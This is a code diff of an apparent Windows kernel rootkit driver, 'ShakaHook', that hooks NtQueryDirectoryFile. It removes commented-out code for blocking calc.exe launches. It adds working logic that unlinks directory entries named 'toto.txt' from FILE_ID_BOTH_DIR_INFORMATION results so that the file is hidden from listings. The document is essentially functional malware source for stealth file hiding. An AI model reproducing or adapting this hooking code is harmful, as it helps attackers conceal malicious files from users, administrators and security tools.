@@ -97,11 +97,7 @@ NTSTATUS NewNtQueryDirectoryFile(
 	BOOLEAN                RestartScan
 )
 {
-	/*UNICODE_STRING calcName, svchostName;
-	PVOID parentProcess, childProcess;
-	PUNICODE_STRING parentName, childName;
-	*/
-	PFILE_ID_BOTH_DIR_INFORMATION fileIdBothDirInformation;
+	PFILE_ID_BOTH_DIR_INFORMATION fileIdBothDirInformation, precedentFileIdBothDirInformation;
 	UNICODE_STRING filename;
 	NTSTATUS rc;
 	ULONG offset = 0; 
@@ -121,35 +117,7 @@ NTSTATUS NewNtQueryDirectoryFile(
 		RestartScan
 	);
 	
-	/*RtlInitUnicodeString(&svchostName, L"\\Device\\HarddiskVolume2\\Windows\\System32\\svchost.exe"); 
-	RtlInitUnicodeString(&calcName, L"\\Device\\HarddiskVolume2\\Windows\\System32\\calc.exe");   	
-				
-	parentProcess = getProcessName(ZwCurrentProcess());
-	childProcess = getProcessName(*ProcessHandle);
 
-	if (parentProcess != NULL && childProcess != NULL)
-	{
-		parentName = (PUNICODE_STRING) parentProcess;
-		childName = (PUNICODE_STRING) childProcess;
-
-		if (RtlCompareUnicodeString(parentProcess, &svchostName, TRUE) != 0 && RtlCompareUnicodeString(childProcess, &calcName, TRUE) == 0)
-		{
-			DbgPrint("BLOCK ====> Parent: %wZ, Child: %wZ\n", parentName, childName);
-			ExFreePoolWithTag(parentProcess, 'Efe');
-			ExFreePoolWithTag(childProcess, 'Efe');
-			return STATUS_ACCESS_DENIED;
-		}
-		else if (RtlCompareUnicodeString(parentProcess, &svchostName, TRUE) == 0 && RtlCompareUnicodeString(childProcess, &calcName, TRUE) == 0)
-		{
-			DbgPrint("Caller proc. PID: %ld\n", PsGetCurrentProcessId());
-			DbgPrint("KEEPING ====> Parent: %wZ, Child: %wZ\n", parentName, childName); 
-		} 
-	}
-
-	if (parentProcess != NULL)
-		ExFreePoolWithTag(parentProcess, 'Efe');
-	if (childProcess != NULL)
-		ExFreePoolWithTag(childProcess, 'Efe');*/
 	RtlInitUnicodeString(&fileToHideName, L"toto.txt"); 
 	DbgPrint("#=== ShakaHook NtQueryDirectoryFile ===#\n");
 	DbgPrint("FileInformationClass: %d\n", FileInformationClass);
@@ -157,28 +125,43 @@ NTSTATUS NewNtQueryDirectoryFile(
 	switch (FileInformationClass)
 	{
 		/*case 12: // _FILE_NAMES_INFORMATION 
-			pFI = (PFILE_NAMES_INFORMATION) FileInformation;
-			filename.Length = ((PFILE_NAMES_INFORMATION) pFI)->FileNameLength;
+			pFI = (PFILE_NAMES_INFORMATION) FileInformation;			filename.Length = ((PFILE_NAMES_INFORMATION) pFI)->FileNameLength;
 			filename.Buffer = ((PFILE_NAMES_INFORMATION) pFI)->FileName;
 			DbgPrint("filename %wZ\n", filename);
 			break;
 			*/
 		case 37: // FILE_ID_BOTH_DIR_INFORMATION 
 			DbgPrint("FILE_ID_BOTH_DIR_INFORMATION \n");
+
+			precedentFileIdBothDirInformation = (PFILE_ID_BOTH_DIR_INFORMATION) ((ULONG) FileInformation + offset);
+			offset += (ULONG) (precedentFileIdBothDirInformation->NextEntryOffset);
+			
 			do
 			{
 				fileIdBothDirInformation = (PFILE_ID_BOTH_DIR_INFORMATION) ((ULONG) FileInformation + offset);
 				filename.Length = fileIdBothDirInformation->FileNameLength;
 				filename.Buffer = (PWSTR)(fileIdBothDirInformation->FileName);
-				DbgPrint("offset %ld, filename %wZ \n", offset, &filename);
-				DbgPrint("%wZ == %wZ \n", &filename, &fileToHideName);
+
+				// DbgPrint("offset %ld, filename %wZ \n", offset, &filename);
+				// DbgPrint("%wZ == %wZ \n", &filename, &fileToHideName);
 				if (RtlCompareUnicodeString(&filename, &fileToHideName, TRUE) == 0)
 				{
-					DbgPrint("C BON FRER \n", offset, &filename);
+					if (fileIdBothDirInformation->NextEntryOffset == 0)
+					{
+						DbgPrint("Hiding (last) %wZ \n", &filename);
+						precedentFileIdBothDirInformation->NextEntryOffset = 0;
+					}
+					else
+					{
+						DbgPrint("Hiding (not last) %wZ \n", &filename);
+						precedentFileIdBothDirInformation->NextEntryOffset += fileIdBothDirInformation->NextEntryOffset;
+					}
 				}
-
 				offset += (ULONG) (fileIdBothDirInformation->NextEntryOffset);
+				precedentFileIdBothDirInformation = fileIdBothDirInformation;
+
 			} while(fileIdBothDirInformation->NextEntryOffset != 0 && offset < Length);
+			
 			break;
 	}
 	return rc;
